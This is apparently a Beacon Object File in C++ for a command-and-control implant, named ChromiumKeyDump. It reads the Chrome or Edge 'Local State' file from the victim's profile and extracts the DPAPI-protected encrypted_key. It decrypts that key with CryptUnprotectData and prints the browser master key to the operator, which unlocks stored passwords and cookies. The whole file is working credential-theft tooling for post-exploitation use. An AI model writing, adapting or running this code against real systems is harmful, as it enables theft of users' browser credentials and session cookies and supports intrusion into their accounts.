#define _WIN32_WINNT 0x06000000

#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>

extern "C" {
#include "beacon.h"
}

#define BOF_REDECLARE(mod, func) extern "C" __declspec(dllimport) decltype(func) mod ## $ ## func
#define BOF_LOCAL(mod, func) decltype(func) * func = mod ## $ ## func

BOF_REDECLARE(KERNEL32, ReadFile);
BOF_REDECLARE(KERNEL32, CreateFileW);
BOF_REDECLARE(KERNEL32, CloseHandle);
BOF_REDECLARE(KERNEL32, GetFileSizeEx);
BOF_REDECLARE(KERNEL32, GetLastError);
BOF_REDECLARE(KERNEL32, LocalFree);
BOF_REDECLARE(OLE32, CoInitializeEx);
BOF_REDECLARE(OLE32, CoUninitialize);
BOF_REDECLARE(OLE32, CoTaskMemFree);
BOF_REDECLARE(SHELL32, SHGetKnownFolderPath);
BOF_REDECLARE(CRYPT32, CryptStringToBinaryA);
BOF_REDECLARE(CRYPT32, CryptBinaryToStringA);
BOF_REDECLARE(CRYPT32, CryptUnprotectData);
BOF_REDECLARE(MSVCRT, malloc);
BOF_REDECLARE(MSVCRT, free);

#define BOF_LOCALS \
    BOF_LOCAL(KERNEL32, ReadFile); \
    BOF_LOCAL(KERNEL32, CreateFileW); \
    BOF_LOCAL(KERNEL32, CloseHandle); \
    BOF_LOCAL(KERNEL32, GetFileSizeEx); \
    BOF_LOCAL(KERNEL32, GetLastError); \
    BOF_LOCAL(KERNEL32, LocalFree); \
    BOF_LOCAL(OLE32, CoInitializeEx); \
    BOF_LOCAL(OLE32, CoUninitialize); \
    BOF_LOCAL(OLE32, CoTaskMemFree); \
    BOF_LOCAL(SHELL32, SHGetKnownFolderPath); \
    BOF_LOCAL(CRYPT32, CryptStringToBinaryA); \
    BOF_LOCAL(CRYPT32, CryptBinaryToStringA); \
    BOF_LOCAL(CRYPT32, CryptUnprotectData); \
    BOF_LOCAL(MSVCRT, malloc); \
    BOF_LOCAL(MSVCRT, free)

extern "C" void go(char* args, int alen) {
    BOF_LOCALS;

    if (alen < 4) {
        BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Browser type not selected\n");
        return;
    }
    datap parser;
    BeaconDataParse(&parser, args, alen);
    const int browserType = BeaconDataInt(&parser);
    const WCHAR* suffix = NULL;
    if (browserType == 0) {
        suffix = L"\\Google\\Chrome\\User Data\\Local State";
    } else if (browserType == 1) {
        suffix = L"\\Microsoft\\Edge\\User Data\\Local State";
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Wrong browser selected\n");
        return;
    }

    HRESULT comResult = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(comResult) && comResult != RPC_E_CHANGED_MODE) {
        BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] CoInitializeEx failed hresult=%08x\n", comResult);
        return;
    }
    const bool shouldUninitialize = SUCCEEDED(comResult);

    PWSTR appData = NULL;
    const GUID localAppData = {0xF1B32785, 0x6FBA, 0x4FCF, {0x9D, 0x55, 0x7B, 0x8E, 0x7F, 0x15, 0x70, 0x91}};
    HRESULT result = SHGetKnownFolderPath(localAppData, 0, NULL, &appData);
    if (FAILED(result) || appData == NULL) {
        if (shouldUninitialize) CoUninitialize();
        BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] SHGetKnownFolderPath failed hresult=%08x\n", result);
        return;
    }

    WCHAR widePath[MAX_PATH];
    size_t baseLength = 0;
    while (baseLength < MAX_PATH && appData[baseLength] != L'\0') ++baseLength;
    size_t suffixLength = 0;
    while (suffix[suffixLength] != L'\0') ++suffixLength;
    if (baseLength + suffixLength >= MAX_PATH) {
        CoTaskMemFree(appData);
        if (shouldUninitialize) CoUninitialize();
        BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Local State path is too long\n");
        return;
    }
    for (size_t i = 0; i < baseLength; ++i) widePath[i] = appData[i];
    for (size_t i = 0; i <= suffixLength; ++i) widePath[baseLength + i] = suffix[i];
    CoTaskMemFree(appData);
    if (shouldUninitialize) CoUninitialize();

    BeaconPrintf(CALLBACK_OUTPUT, "[ChromiumKeyDump] Target File: %S\n", widePath);

    HANDLE file = INVALID_HANDLE_VALUE;
    char* contents = NULL;
    BYTE* encrypted = NULL;
    char* encoded = NULL;
    DATA_BLOB plaintext = {0, NULL};

    do {
        file = CreateFileW(widePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (file == INVALID_HANDLE_VALUE) {
            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] CreateFileW failed lasterror=%08x\n", GetLastError());
            break;
        }

        LARGE_INTEGER fileSize;
        if (!GetFileSizeEx(file, &fileSize) || fileSize.QuadPart < 0 ||
            fileSize.QuadPart > 16 * 1024 * 1024) {
            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Local State is too large or cannot be read\n");
            break;
        }

        DWORD length = (DWORD)fileSize.QuadPart;
        contents = (char*)malloc((size_t)length + 1);
        if (contents == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Could not allocate Local State buffer\n");
            break;
        }

        DWORD total = 0;
        while (total < length) {
            DWORD received = 0;
            if (!ReadFile(file, contents + total, length - total, &received, NULL) || received == 0) {
                BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Could not read Local State\n");
                break;
            }
            total += received;
        }
        if (total != length) {
            break;
        }
        contents[length] = '\0';

        // Chromium stores a base64-encoded DPAPI blob in os_crypt.encrypted_key.
        // Search within the bytes actually read; never scan beyond the buffer.
        const char marker[] = "\"encrypted_key\"";
        const DWORD markerLength = sizeof(marker) - 1;
        DWORD keyStart = length;
        DWORD keyEnd = length;
        for (DWORD i = 0; i + markerLength < length; ++i) {
            DWORD matched = 0;
            while (matched < markerLength && contents[i + matched] == marker[matched]) {
                ++matched;
            }
            if (matched != markerLength) {
                continue;
            }
            DWORD pos = i + markerLength;
            while (pos < length && (contents[pos] == ' ' || contents[pos] == '\t' || contents[pos] == '\r' || contents[pos] == '\n')) {
                ++pos;
            }
            if (pos >= length || contents[pos++] != ':') {
                continue;
            }
            while (pos < length && (contents[pos] == ' ' || contents[pos] == '\t' || contents[pos] == '\r' || contents[pos] == '\n')) {
                ++pos;
            }
            if (pos >= length || contents[pos++] != '"') {
                continue;
            }
            keyStart = pos;
            while (pos < length && contents[pos] != '"') {
                ++pos;
            }
            keyEnd = pos;
            break;
        }
        if (keyStart >= keyEnd || keyEnd >= length) {
            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] EncryptedKey not found\n");
            break;
        }

        DWORD encryptedLength = 0;
        if (!CryptStringToBinaryA(contents + keyStart, keyEnd - keyStart, CRYPT_STRING_BASE64,
                                  NULL, &encryptedLength, NULL, NULL) || encryptedLength <= 5) {
            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Invalid encrypted key encoding\n");
            break;
        }
        encrypted = (BYTE*)malloc(encryptedLength);
        if (encrypted == NULL || !CryptStringToBinaryA(contents + keyStart, keyEnd - keyStart,
                                                        CRYPT_STRING_BASE64, encrypted, &encryptedLength,
                                                        NULL, NULL)) {
            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Could not decode encrypted key\n");
            break;
        }
        const char prefix[] = "DPAPI";
        bool hasPrefix = encryptedLength > 5;
        for (DWORD i = 0; i < 5 && hasPrefix; ++i) {
            hasPrefix = encrypted[i] == (BYTE)prefix[i];
        }
        if (!hasPrefix) {
            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Unsupported encrypted key format\n");
            break;
        }

        DATA_BLOB ciphertext = {encryptedLength - 5, encrypted + 5};
        if (!CryptUnprotectData(&ciphertext, NULL, NULL, NULL, NULL, 0, &plaintext)) {
            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] CryptUnprotectData failed\n");
            break;
        }

        DWORD encodedLength = 0;
        const DWORD flags = CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF;
        if (!CryptBinaryToStringA(plaintext.pbData, plaintext.cbData, flags, NULL, &encodedLength) ||
            encodedLength == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Could not encode decrypted key\n");
            break;
        }
        encoded = (char*)malloc(encodedLength);
        if (encoded == NULL || !CryptBinaryToStringA(plaintext.pbData, plaintext.cbData, flags,
                                                      encoded, &encodedLength)) {
            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Could not encode decrypted key\n");
            break;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[ChromiumKeyDump] Masterkey: %s\n", encoded);
    } while (false);

    if (encoded != NULL) free(encoded);
    if (plaintext.pbData != NULL) LocalFree(plaintext.pbData);
    if (encrypted != NULL) free(encrypted);
    if (contents != NULL) free(contents);
    if (file != INVALID_HANDLE_VALUE) CloseHandle(file);
}
